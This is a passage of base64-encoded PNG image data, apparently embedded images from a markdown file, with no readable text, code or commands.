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

[img-2]:data:image/png;base64,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IWAIJBFYJtfJZGN2bAgYAoaAIWAIGAI1D4FIszBrwUL3rhg2GC1F4AuJOgmNkmiVFvRkKS6ltEcsquniIz9p5tJodqXEn/FiCBgChkB1QmCcuNhmI/WGOOCAA9zgwYOznbcyQ8AQMAQMAUPAECgjBGpLcI5fCB8qlOEN0apVK/fDDz+4Rx55pIzgSB/qgw8+6C699FL31FNPuTXWKCwASnqrVmN5ItCxY0fH74QTTliezVpbhoAhYAiUJQIfffSRu/jiiyuMXZchatWqpZNhy5YtK1Qo54JGjRbHndh7773d2mtLIiujkkNgtdVWc82bN3f77rtvyfFmDBkChoAhUN0QCPEVknybgWMSETs2BAwBQ8AQMAQMgQwETFjIgMMODAFDwBAwBAwBQyCJgAkLSUTs2BAwBAwBQ8AQMAQyEDBhIQMOOzAEDAFDwBAwBAyBJAJFFRb+8Ic/SObIVfSHe0a7du3cW2+9lcHj/Pnz3dFHH63uG+uvv75avf/6a3n71B9xxBGK2f/+978MrDgoBFPqPf/8827XXXd1DRo0UOPNFi1auDPOOMNNmDCB01nphhtucK1bt3Zrrrmma9OmTdY6VmgIGAKGgCFQ8xAoqrAAnL169XK//PKLGzFihGvWrJk76qijMlA+66yz3CeffOJw53j77bfdq6++6nr27JlRp5wOZs2a5V544QWHu+utt96adehpmN59993u8MMPd3/84x9VOPvxxx/do48+6vCKefLJJ7O2SWGTJk3cueeea26KORGyE4aAIWAI1EwEii4srLrqqq527dpuww03dKeeeqobP368mzp1qqKNC8djjz3mLrjgArf55pvrBInwQPyDcqWBAwe6DTbYwPXu3VsndgStJOXDFK3MhRde6E4//XR39dVXu6233trVq1dPNQb9+vVzPXr0SDYXHXfu3Nl16dLFNW7cOCqzHUPAEDAEDIGaj0DRhYUA8aJFi1QwQLvAcgM0evRoN336dLfTTjuFarqPQDFjxoyorJx27rnnHnfooYe6v/71r27hwoWqEcg1/myYDhs2zE2aNMl169Yt12VWbggYAoaAIWAIZCBQdGGBr1m0Cuuss44bNGiQe+aZZ3Q9Hi5nz56tzIZwkxywxg6hji83Yjlm+PDh7thjj3Wrr766BiK66667KsCQD9PJkydr/U033TS67swzz9R7wH04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